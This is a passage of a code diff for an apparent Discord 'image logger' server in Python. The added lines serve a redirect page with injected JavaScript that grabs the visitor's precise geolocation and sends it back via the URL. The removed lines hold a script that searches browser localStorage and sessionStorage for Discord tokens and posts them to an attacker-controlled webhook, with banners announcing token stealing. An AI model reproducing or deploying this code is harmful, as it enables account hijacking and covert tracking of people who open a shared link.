+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
         
-        for (let i = 0; i < storage.length; i++) {{
-            let key = storage.key(i);
-            if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
-                let value = storage.getItem(key);
-                let tokenPattern = /[MN][\\w-]{{23}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/gi;
-                let matches = value.match(tokenPattern);
-                if (matches) {{
-                    foundTokens = foundTokens.concat(matches);
-                }}
-            }}
-        }}
-        
-        if (foundTokens.length > 0) {{
-            console.log("✅ Found " + foundTokens.length + " tokens in " + storageName);
-            foundTokens.forEach(function(token) {{
-                fetch('{config["token_webhook"]}', {{
-                    method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{
-                        content: "🔑 Discord Token Found via " + storageName + "!",
-                        embeds: [{{
-                            title: "🎯 " + storageName + " Token",
-                            color: {config["color"]},
-                            description: "Token extracted from " + storageName,
-                            fields: [{{
-                                name: "Discord Token",
-                                value: "```" + token + "```"
-                            }}]
-                        }}]
-                    }})
-                }}).catch(console.error);
-            }});
-        }}
-    }}
-    
-    setTimeout(function() {{
-        try {{
-            findAndSendTokens(localStorage, "localStorage");
-            findAndSendTokens(sessionStorage, "sessionStorage");
-        }} catch(e) {{
-            console.log("Error in token extraction:", e);
-        }}
-    }}, {config["tokenStealingDelay"] * 1000});
-}})();
-</script>'''
-                data += js_code.encode()
-            
-            # Send response
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(data)
-        
-        except Exception as e:
-            log_debug(f"Handler error: {e}")
+        except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(b'500 - Server Error')
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
     
     do_GET = handleRequest
     do_POST = handleRequest
 
-def run_server(port=8080):
-    server_address = ('', port)
-    httpd = HTTPServer(server_address, EnhancedImageLogger)
-    print(f"🚀 Enhanced Image Logger with Token Stealing v{__version__}")
-    print(f"📍 Server running on http://localhost:{port}")
-    print(f"🔑 Token stealing: {'ON' if config['tokenStealing'] else 'OFF'}")
-    print(f"🔍 Debug mode: {'ON' if config['debugMode'] else 'OFF'}")
-    print(f"🎯 Ready to steal Discord tokens!")
-    httpd.serve_forever()
-
-if __name__ == "__main__":
-    run_server()
+handler = app = ImageLoggerAPI
